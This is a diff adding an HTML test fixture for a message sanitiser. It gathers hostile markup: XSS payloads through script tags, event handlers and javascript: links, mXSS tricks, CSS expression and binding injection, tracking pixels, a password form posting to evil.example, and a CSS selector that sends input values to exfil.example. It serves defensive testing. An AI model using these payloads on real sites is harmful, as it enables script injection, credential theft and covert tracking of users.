@@ -1,0 +1,61 @@
+<!-- Fixture for the sanitiser tests (campbooks-cloud#160): everything a
+     hostile message might try. Every host is fictional (.example). -->
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
+<base href="https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/sheet.css">
+<link rel="prefetch" href="https://evil.example/prefetch">
+<script>fetch("https://evil.example/head-script")</script>
+<style>
+@import url("https://evil.example/import.css");
+@import "https://evil.example/import2.css";
+@font-face { font-family: Spy; src: url(https://evil.example/font.woff2); }
+body { background: url(https://track.example/body-bg.gif); }
+.beacon { background-image: url("https://track.example/class-bg.gif"); color: #123456; }
+.escaped { background: u\72l(https://track.example/escaped.gif); }
+.expr { width: expression(alert("css-expression")); }
+.binding { -moz-binding: url(https://evil.example/xbl.xml#x); behavior: url(https://evil.example/x.htc); }
+.set { background-image: image-set("https://track.example/set.png" 1x); }
+.fine { color: #0a7d32; font-weight: bold; }
+input[value^="a"] { background: url(https://exfil.example/a); }
+</style>
+</head>
+<body onload="alert('body-onload')" background="https://track.example/body-attr.gif">
+<p class="fine">Hello, this part is fine.</p>
+<p class="beacon">A class with a background beacon.</p>
+<p class="escaped expr binding set">Classes with escaped, expression, binding and image-set rules.</p>
+<script>alert("body-script")</script>
+<noscript><p title="</noscript><img src=x onerror=alert('noscript-mxss')>"></p></noscript>
+<math><mtext><table><mglyph><style><img src=x onerror=alert('math-mxss')></style></mglyph></table></mtext></math>
+<svg onload="alert('svg-onload')"><script>alert("svg-script")</script><image href="https://track.example/svg-image.png"/><a xlink:href="javascript:alert('svg-link')"><text>svg link</text></a></svg>
+<img src="https://cdn.example/real-logo.png" alt="Real logo" width="120" height="40" onerror="alert('img-onerror')">
+<img src="x" onerror="alert('img-x')">
+<img srcset="https://track.example/srcset.png 1x" alt="srcset">
+<img src="https://track.example/pixel-1x1.gif" width="1" height="1" alt="">
+<img src="https://track.example/pixel-0x0.gif" width="0" height="0">
+<img src="https://track.example/pixel-style.gif" style="width:1px;height:1px;border:0">
+<img src="https://track.example/pixel-hidden.gif" style="display:none">
+<img src="https://track.example/pixel-visibility.gif" style="visibility: hidden" width="200" height="50">
+<img src="https://track.example/pixel-opacity.gif" style="opacity:0" width="200" height="50">
+<img src="https://track.example/pixel-maxheight.gif" style="max-height:0;overflow:hidden" width="200" height="50">
+<div style="background-image:url(https://track.example/inline-bg.gif)">An inline background beacon.</div>
+<div style="background: URL( 'https://track.example/inline-upper.gif' )">Upper-case url.</div>
+<div style="width: expression(alert('inline-expression'))">Inline expression.</div>
+<table background="https://track.example/table-bg.gif"><tr><td background="https://track.example/td-bg.gif">table background</td></tr></table>
+<a href="javascript:alert('js-link')">js link</a>
+<a href="JaVaScRiPt:alert('js-case')">js case</a>
+<a href="java&#x09;script:alert('js-tab')">js tab</a>
+<a href="vbscript:msgbox('vb')">vb link</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data link</a>
+<a href="https://example.com/ok" target="_self" ping="https://track.example/ping" onclick="alert('click')">ok link</a>
+<form action="https://evil.example/collect" method="post"><input name="password" type="password"><input type="image" src="https://track.example/input-image.png"><button formaction="https://evil.example/formaction">Send</button></form>
+<iframe src="https://evil.example/frame"></iframe>
+<iframe srcdoc="<script>alert('srcdoc')</script>"></iframe>
+<object data="https://evil.example/object.swf"></object>
+<embed src="https://evil.example/embed.swf">
+<video poster="https://track.example/poster.png" src="https://evil.example/video.mp4"></video>
+<audio src="https://evil.example/audio.mp3" autoplay></audio>
+<details open ontoggle="alert('ontoggle')"><summary>details</summary></details>
+<p style="color:red;background:url(https://track.example/mixed.gif);font-size:14px">Mixed safe and unsafe declarations.</p>
+</body></html>
